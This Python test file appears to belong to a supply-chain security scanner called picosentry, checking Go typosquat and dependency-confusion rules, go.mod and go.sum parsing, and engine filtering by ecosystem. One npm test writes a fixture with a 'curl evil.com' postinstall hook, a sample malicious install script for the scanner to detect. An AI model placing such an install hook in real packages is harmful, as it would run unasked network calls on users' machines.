"""Tests for Go ecosystem rules.

Tests cover:
- Ecosystem detection (go.mod)
- Go typosquat detection (L2-GO-TYPO-001)
- Go dependency confusion (L2-GO-DEPC-001)
- Go advisory check (L2-GO-ADV-001)
- Engine ecosystem filtering
"""

from pathlib import Path

from picosentry.scan.engine import create_default_engine

# ── Fixture helpers ────────────────────────────────────────────────────

FIXTURES = Path(__file__).parent / "fixtures"


def _go_clean() -> Path:
    return FIXTURES / "go_clean"


def _go_malicious() -> Path:
    return FIXTURES / "go_malicious"


# ── Ecosystem detection ────────────────────────────────────────────────


class TestGoDetection:
    """Go project detection should work with go.mod."""

    def test_detects_go_mod(self):
        from picosentry.scan.rules.go_utils import detect_go_project

        assert detect_go_project(_go_clean())

    def test_detects_go_mod_malicious(self):
        from picosentry.scan.rules.go_utils import detect_go_project

        assert detect_go_project(_go_malicious())

    def test_no_indicator_returns_false(self, tmp_path):
        from picosentry.scan.rules.go_utils import detect_go_project

        assert not detect_go_project(tmp_path)


# ── Engine ecosystem filtering ─────────────────────────────────────────


class TestGoEcosystemFiltering:
    """The engine should filter Go rules when the target has no Go indicators."""

    def test_npm_project_skips_go_rules(self, tmp_path):
        """A plain npm project should not run Go rules."""
        (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        for f in result.findings:
            assert not f.rule_id.startswith("L2-GO-"), f"Unexpected Go rule: {f.rule_id}"

    def test_go_project_skips_npm_rules(self, tmp_path):
        """A Go project should not show npm findings (no node_modules)."""
        (tmp_path / "go.mod").write_text(
            "module example.com/test\n\ngo 1.21\n\nrequire (\n\tcompany-internal-lib v0.1.0\n)\n"
        )
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        go_findings = [f for f in result.findings if f.ecosystem == "go"]
        assert len(go_findings) >= 1, f"Expected Go findings, got: {result.findings}"

    def test_go_rules_registered(self):
        """All Go rule IDs should be registered by default."""
        engine = create_default_engine()
        rules = engine.list_rules()
        shared_rules = [r for r in rules if r in ("L2-TYPO-001", "L2-DEPC-001", "L2-ADV-001")]
        assert len(shared_rules) == 3, f"Expected shared rules, got {len(shared_rules)}"
        assert "L2-TYPO-001" in shared_rules
        assert "L2-DEPC-001" in shared_rules
        assert "L2-ADV-001" in shared_rules


# ── Typosquat tests ────────────────────────────────────────────────────


class TestGoTyposquat:
    """Go typosquat detection (L2-GO-TYPO-001)."""

    def test_detects_typosquat_in_go_mod(self):
        """go.mod with 'jin' (typo for 'gin') should trigger typosquat."""
        from picosentry.scan.rules.typosquat import detect_all_typosquat as detect_go_typosquat

        target = _go_malicious()
        findings = detect_go_typosquat(target, Path(""))
        typos = [f for f in findings if f.rule_id == "L2-GO-TYPO-001"]
        assert len(typos) >= 1, f"Expected typosquat finding, got: {[f.package for f in findings]}"
        assert typos[0].ecosystem == "go"

    def test_clean_project_no_typosquats(self):
        """Clean project should have no typosquat findings."""
        from picosentry.scan.rules.typosquat import detect_all_typosquat as detect_go_typosquat

        target = _go_clean()
        findings = detect_go_typosquat(target, Path(""))
        assert len(findings) == 0, f"Clean project should have no typos: {findings}"


# ── Dependency confusion tests ──────────────────────────────────────────


class TestGoDependencyConfusion:
    """Go dependency confusion detection (L2-GO-DEPC-001)."""

    def test_detects_internal_dep_without_private_config(self):
        """internal-secrets without GOPRIVATE should be flagged."""
        from picosentry.scan.rules.dep_confusion import detect_all_dep_confusion as detect_go_dep_confusion

        target = _go_malicious()
        findings = detect_go_dep_confusion(target)
        internal = [f for f in findings if "internal" in f.package]
        assert len(internal) >= 1, f"Expected dep confusion finding, got: {[f.package for f in findings]}"
        assert internal[0].rule_id == "L2-GO-DEPC-001"

    def test_clean_project_no_confusion(self):
        """Clean project with only public GitHub deps should have no confusion findings."""
        from picosentry.scan.rules.dep_confusion import detect_all_dep_confusion as detect_go_dep_confusion

        target = _go_clean()
        findings = detect_go_dep_confusion(target)
        assert len(findings) == 0, f"Clean project should have no dep confusion: {findings}"

    def test_go_env_private_skips_flags(self, tmp_path):
        """When GOPRIVATE is configured, internal deps are safe."""
        from picosentry.scan.rules.dep_confusion import detect_all_dep_confusion as detect_go_dep_confusion

        (tmp_path / "go.mod").write_text("module test\n\ngo 1.21\n\nrequire (\n\tinternal-secrets v0.1.0\n)\n")
        (tmp_path / "go.env").write_text("GOPRIVATE=internal-secrets\n")
        findings = detect_go_dep_confusion(tmp_path)
        internal = [f for f in findings if "internal" in f.package]
        assert len(internal) == 0, f"GOPRIVATE should suppress dep confusion: {internal}"


# ── parse_go_mod tests ──────────────────────────────────────────────────


class TestGoModParsing:
    """go.mod parsing should correctly extract module metadata."""

    def test_parse_module_name(self):
        from picosentry.scan.rules.go_utils import parse_go_mod

        data = parse_go_mod(_go_clean())
        assert data is not None
        assert "github.com/example/my-awesome-module" in data.get("module", "")

    def test_parse_direct_deps(self):
        from picosentry.scan.rules.go_utils import parse_go_mod

        data = parse_go_mod(_go_clean())
        assert data is not None
        deps = {mod for mod, _ver in data.get("require", [])}
        assert "github.com/gin-gonic/gin" in deps
        assert "golang.org/x/crypto" in deps

    def test_no_go_mod_returns_none(self, tmp_path):
        from picosentry.scan.rules.go_utils import parse_go_mod

        assert parse_go_mod(tmp_path) is None


class TestGoSumParsing:
    """go.sum parsing should correctly extract pinned versions."""

    def test_parse_go_sum(self):
        from picosentry.scan.rules.go_utils import parse_go_sum

        entries = parse_go_sum(_go_clean())
        assert len(entries) >= 1
        mods = {e[0] for e in entries}
        assert "github.com/gin-gonic/gin" in mods

    def test_no_go_sum_returns_empty(self, tmp_path):
        from picosentry.scan.rules.go_utils import parse_go_sum

        assert parse_go_sum(tmp_path) == []


class TestGoUtils:
    """Go utility functions should work correctly."""

    def test_get_module_short_name(self):
        from picosentry.scan.rules.go_utils import get_module_short_name

        assert get_module_short_name("github.com/gin-gonic/gin") == "gin"
        assert get_module_short_name("golang.org/x/crypto") == "crypto"
        assert get_module_short_name("k8s.io/client-go") == "client-go"

    def test_get_go_dep_names(self):
        from picosentry.scan.rules.go_utils import get_go_dep_names

        data = {
            "module": "test",
            "require": [
                ("github.com/gin-gonic/gin", "v1.9.1"),
                ("golang.org/x/crypto", "v0.14.0"),
            ],
        }
        deps = get_go_dep_names(data)
        assert "github.com/gin-gonic/gin" in deps
        assert "golang.org/x/crypto" in deps

    def test_detect_goproxy_private(self):
        from picosentry.scan.rules.go_utils import detect_goproxy_private

        target = _go_clean()
        assert not detect_goproxy_private(target)  # Clean project has no private config

    def test_detect_goproxy_private_with_env(self, tmp_path):
        from picosentry.scan.rules.go_utils import detect_goproxy_private

        (tmp_path / "go.env").write_text("GOPRIVATE=internal-secrets\n")
        assert detect_goproxy_private(tmp_path)

    def test_detect_goproxy_private_with_replace(self, tmp_path):
        from picosentry.scan.rules.go_utils import detect_goproxy_private

        (tmp_path / "go.mod").write_text(
            "module test\n\ngo 1.21\n\nrequire (\n\tinternal-pkg v0.1.0\n)\n\n"
            "replace internal-pkg => ./local/internal-pkg\n"
        )
        assert detect_goproxy_private(tmp_path)


# ── Full engine integration tests ──────────────────────────────────────


class TestGoIntegration:
    """Full engine scan against Go fixtures."""

    def test_clean_project_no_findings(self):
        """A clean Go project should produce minimal findings."""
        engine = create_default_engine()
        result = engine.scan(str(_go_clean()))
        go_findings = [f for f in result.findings if f.ecosystem == "go"]
        assert len(go_findings) == 0, f"Clean Go project should have no Go findings: {go_findings}"

    def test_malicious_project_has_findings(self):
        """A malicious Go project should produce findings."""
        engine = create_default_engine()
        result = engine.scan(str(_go_malicious()))
        go_findings = [f for f in result.findings if f.ecosystem == "go"]
        assert len(go_findings) >= 1, f"Expected Go findings from malicious fixture, got: {len(go_findings)}"

    def test_ecosystem_field_on_go_findings(self):
        """Go findings should have ecosystem='go'."""
        engine = create_default_engine()
        result = engine.scan(str(_go_malicious()))
        go_findings = [f for f in result.findings if f.ecosystem == "go"]
        if go_findings:
            for f in go_findings:
                assert f.ecosystem == "go"
                d = f.to_dict()
                assert d["ecosystem"] == "go"

    def test_npm_findings_still_have_npm_ecosystem(self, tmp_path):
        """npm findings should still default to ecosystem='npm'."""
        (tmp_path / "package.json").write_text(
            '{"name":"test","version":"1.0.0","scripts":{"postinstall":"curl evil.com"}}'
        )
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        npm_findings = [f for f in result.findings if f.ecosystem == "npm"]
        if npm_findings:
            for f in npm_findings:
                d = f.to_dict()
                assert d["ecosystem"] == "npm"
